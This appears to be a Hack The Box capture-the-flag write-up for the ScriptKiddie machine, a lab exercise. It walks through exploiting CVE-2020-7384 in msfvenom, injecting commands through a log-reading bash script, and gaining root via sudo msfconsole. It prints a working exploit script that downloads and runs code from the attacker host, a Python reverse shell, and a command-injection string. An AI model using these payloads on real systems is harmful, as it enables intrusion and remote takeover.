---
title: ScriptKiddie [HackTheBox-WriteUp]
date: 2021-03-03 12:00:00 +0800
categories: [HackTheBox, Machines]
# tags: ["Hack The Box", "Write-Up", "CVE-2020-7384: Rapid7 Metasploit Framework msfvenom APK Template Command Injection", "sudo NOPASSWD"]     # TAG names should always be lowercase
tags: ["hack the box", write-up, cve-2020-7384, "sudo nopasswd"]
image: /assets/posts/ctf/hackthebox/machines/scriptkiddie/img/scriptkiddie.png
---

# TL;DR

---

> CVE-2020-7384: Rapid7 Metasploit Framework msfvenom APK Template Command Injection `->` OS command injection via vulnerable bash code in scanlosers.sh `->` Sudo NOPASSWD Metasploit Framework

---

# Enumeration

---

## masscan

```terminal
$ sudo masscan -p1-65535 --rate 1000 -e eth0 -Pn 10.10.10.226 | tee scriptkiddie.masscan

Discovered open port 5000/tcp on 10.10.10.226                                  
Discovered open port 22/tcp on 10.10.10.226
```

## nmap

```terminal
$ sudo nmap -p$(cat scriptkiddie.masscan | awk '{print $4}' | awk -F "/" '{print $1}' | sort -u | tr "\n" "," | sed s/,$//) -Pn -A -sC -sV --version-intensity 5 -oA scriptkiddie.htb 10.10.10.226

# Nmap 7.91 scan initiated Wed Mar  3 13:02:13 2021 as: nmap -A -Pn -p22,5000 --version-intensity 5 -oA TCP_nmap_10.10.10.226 10.10.10.226
Nmap scan report for 10.10.10.226
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5000/tcp)
HOP RTT       ADDRESS
1   255.79 ms 10.10.14.1
2   256.99 ms 10.10.10.226

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar  3 13:02:47 2021 -- 1 IP address (1 host up) scanned in 35.40 seconds
```

---

# Exploitation

---

nmap shows port 5000 is running `Werkzeug` web service.

```terminal
$ cat enum/TCP_nmap_10.10.10.226.nmap | grep 5000

# Nmap 7.91 scan initiated Wed Mar  3 13:02:13 2021 as: nmap -A -Pn -p22,5000 --version-intensity 5 -oA TCP_nmap_10.10.10.226 10.10.10.226
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
```

`http://10.10.10.226:5000/` brought us to `k1d'5 h4ck3r t00l5` web page.

![Landing Page](/assets/posts/ctf/hackthebox/machines/scriptkiddie/img/kid_hacker.png)
_k1d'5 h4ck3r t00l5 landing page_

Running through the application, it has three (3) functions:
1. ping
2. payload creator via msfvenom
3. exploit-db

msfvenom offers three (3) environments:
1. windows
2. linux
3. android

After googling, we found that the `Metasploit Framework` installed vulnerable to [**CVE-2020-7384: Rapid7 Metasploit Framework msfvenom APK Template Command Injection**](https://packetstormsecurity.com/files/160004/Rapid7-Metasploit-Framework-msfvenom-APK-Template-Command-Injection.html).

CVE Description:

> Rapid7's Metasploit msfvenom framework handles APK files in a way that allows for a malicious user to craft and publish a file that would execute arbitrary commands on a victim's machine. Affects Metasploit Framework <= 6.0.11 and Metasploit Pro <= 4.18.0.

## CVE-2020-7384: Rapid7 Metasploit Framework msfvenom APK Template Command Injection

`exploit-db` shows the following available exploit scripts:

```terminal
$ searchsploit metasploit apk
----------------------------------------------------------------------- -------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- -------------------------
Android Janus - APK Signature Bypass (Metasploit)                      | android/local/47601.rb
Metasploit Framework 6.0.11 - msfvenom APK template command injection  | multiple/local/49491.py
-------------------------------------------------------------------------------------------------
```

Use the following [**exploit**](https://www.exploit-db.com/exploits/49491) and we managed to perform RCE.

We need to customize the exploit script with the following payload:

```python
#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b64encode

# Change me
payload = 'wget http://10.10.14.16:8000/rev.py; sleep 2; python3 rev.py' # download reverse shell, sleep for 2s and execute the script
print(payload)

# b64encode to avoid badchars (keytool is picky)
payload_b64 = b64encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b64} | base64 -d | sh #"

print(f"[+] Manufacturing evil apkfile")
print(f"Payload: {payload}")
print(f"-dname: {dname}")
print()

# tmpdir = tempfile.mkdtemp()
# apk_file = os.path.join(tmpdir, "evil.apk")
apk_file = "dug.apk"
# empty_file = os.path.join(tmpdir, "empty")
empty_file = "empty"
#keystore_file = os.path.join(tmpdir, "signing.keystore")
keystore_file = "signing.keystore"
storepass = keypass = "password"
key_alias = "signing.key"

# Touch empty_file
open(empty_file, "w").close()

# Create apk_file
subprocess.check_call(["zip", "-j", apk_file, empty_file])

# Generate signing key with malicious -dname
subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

# Sign APK using our malicious dname
subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

print()
print(f"[+] Done! apkfile is at {apk_file}")
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")
```

The script will output malicious .apk file, then we will upload it and trigger the msfvenom vulnerability.

![Upload](/assets/posts/ctf/hackthebox/machines/scriptkiddie/img/upload.png)
_upload malicious .apk_

```terminal
$ python -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.226 - - [03/Mar/2021 18:12:52] "GET /rev.py HTTP/1.1" 200 -
----------------------------------------------------------------------

$ nc -nvlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.226.
Ncat: Connection from 10.10.10.226:50220.
kid@scriptkiddie:~/html$ id
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```

![Upload](/assets/posts/ctf/hackthebox/machines/scriptkiddie/img/kid.png)
_Managed to obtain reverse shell_

User flag can be found in `/home/kid/user.txt`.

---

# Post Exploitation

---

## [USER: pwn] -> OS command injection via vulnerable bash code in scanlosers.sh
 
`/home/pwn` shows `scanlosers.sh`.

`/home/kid/logs` shows `hackers` file with user `kid` as file owner and user `pwn` as group owner. Detail [**article**](https://linuxize.com/post/how-to-list-files-in-linux-using-the-ls-command/).

```terminal
kid@scriptkiddie:~/html$ ls -lsa /home/pwn/
total 44
4 drwxr-xr-x 6 pwn  pwn  4096 Feb  3 12:06 .
4 drwxr-xr-x 4 root root 4096 Feb  3 07:40 ..
0 lrwxrwxrwx 1 root root    9 Feb  3 12:06 .bash_history -> /dev/null
4 -rw-r--r-- 1 pwn  pwn   220 Feb 25  2020 .bash_logout
4 -rw-r--r-- 1 pwn  pwn  3771 Feb 25  2020 .bashrc
4 drwx------ 2 pwn  pwn  4096 Jan 28 17:08 .cache
4 drwxrwxr-x 3 pwn  pwn  4096 Jan 28 17:24 .local
4 -rw-r--r-- 1 pwn  pwn   807 Feb 25  2020 .profile
4 -rw-rw-r-- 1 pwn  pwn    74 Jan 28 16:22 .selected_editor
4 drwx------ 2 pwn  pwn  4096 Feb 10 16:10 .ssh
4 drwxrw---- 2 pwn  pwn  4096 Feb  3 12:00 recon
4 -rwxrwxr-- 1 pwn  pwn   250 Jan 28 17:57 scanlosers.sh
kid@scriptkiddie:~/html$ ls -lsa ~/logs/
total 8
4 drwxrwxrwx  2 kid kid 4096 Feb  3 07:40 .
4 drwxr-xr-x 11 kid kid 4096 Feb  3 11:49 ..
0 -rw-rw-r--  1 kid pwn    0 Feb  3 11:46 hackers
kid@scriptkiddie:~/html$ 
```

`scanlosers.sh` contains the following bash script.

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

Refer the following line by line explaination:

> `Line 3`: Set log path on "/home/kid/logs/hackers"

> `Line 5`: Change directory to "/home/pwn"

> `Line 6`: Read "/home/kid/logs/hackers" and cut with blank space as delimiter and pull out third field of interest, then sort in order. The output will be declared as ip.

> `Line 7`: Perform nmap in loop then output in "/home/pwn/recon. 2>&1 means redirect standard error stream to standard output, in this case /dev/null"

> `Line 10`: Clear whatever in "/home/kid/logs/hackers"

![Vulnerable](/assets/posts/ctf/hackthebox/machines/scriptkiddie/img/vuln.png)
_Vulnerable code_

Thus, we can exploit on `line 7` since no sanitization on `${ip}`. We can inject OS command with little tweaks and bypass `line 6: cut -d' ' -f3-`. 

1. We need to add `single semicolon (;)` to close nmap command.

2. Add `two (2) whitespaces` to bypass the delimiter and three (3) field of interest.

3. Add `number sign or hashtag (#)` to comment out whatever code after ${ip}.

Ping payload as follows:

```bash
echo "  ;/bin/bash -c 'ping 127.0.0.1' #"
```

Example:

```terminal
# No space
$ echo ";/bin/bash -c 'ping 127.0.0.1' #" | cut -d' ' -f3-
'ping 127.0.0.1' #

# One space
$ echo " ;/bin/bash -c 'ping 127.0.0.1' #" | cut -d' ' -f3-
-c 'ping 127.0.0.1' #

Two spaces
$ echo "  ;/bin/bash -c 'ping 127.0.0.1' #" | cut -d' ' -f3-
;/bin/bash -c 'ping 127.0.0.1' #
```

We customize the `scanlosers.sh` and trigger the ping command locally.

```bash
#!/bin/bash

log=/mnt/hgfs/1337/CTF/HackTheBox/Machine/ScriptKiddie/www/ip.txt

cd /mnt/hgfs/1337/CTF/HackTheBox/Machine/ScriptKiddie/www
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    echo ${ip}
    sleep 5
    echo "[+] NMAP start"
    sleep 5
    echo "[+] Injecting on ${ip}"
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
    echo "[+] DONE inject"
    sleep 5
done
echo "[+] DONE LOOP"

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; echo "[+] DONE CLEAR"; fi
```

![ping](/assets/posts/ctf/hackthebox/machines/scriptkiddie/img/ping.png)
_Trigger ping locally_

Final reverse shell payload:

```bash
kid@scriptkiddie:~/logs$ cat /home/kid/html/rev.py 
import pty
import socket,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.16",9090))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
kid@scriptkiddie:~/logs$ echo "  ;/bin/bash -c 'python3 /home/kid/html/rev.py' #" >> hackers
```

![pwn](/assets/posts/ctf/hackthebox/machines/scriptkiddie/img/pwn.png)
_Escalated privilege to user `pwn`_

## [USER: root] -> Sudo NOPASSWD Metasploit Framework 

List of sudo shows user pwn can `execute metasploit framework as root without password`.

```terminal
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

To escalate privilege to root, simply run the following command:

```terminal
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
[*] starting the Metasploit Framework console...|

+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf6 > id
[*] exec: id

uid=0(root) gid=0(root) groups=0(root)
```

We managed to get reverse shell as follows:

```terminal
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
[*] starting the Metasploit Framework console...|

+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf6 > python3 /home/kid/html/rev.py                                                          
[*] exec: python3 /home/kid/html/rev.py

------------------------------------------------------------------------------------

farzul@dugisan3rd:/mnt/hgfs/1337/CTF/HackTheBox/Machine/ScriptKiddie$ nc -nvlp 9191
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9191
Ncat: Listening on 0.0.0.0:9191
Ncat: Connection from 10.10.10.226.
Ncat: Connection from 10.10.10.226:51324.
root@scriptkiddie:/home/pwn# id
id
uid=0(root) gid=0(root) groups=0(root)
root@scriptkiddie:/home/pwn# wc -c /root/root.txt
wc -c //root/root.txt
33 //root/root.txt
```

![viminfo](/assets/posts/ctf/hackthebox/machines/scriptkiddie/img/root.png)
_root pwned_

Root flag can be found in `/root/root.txt`.

---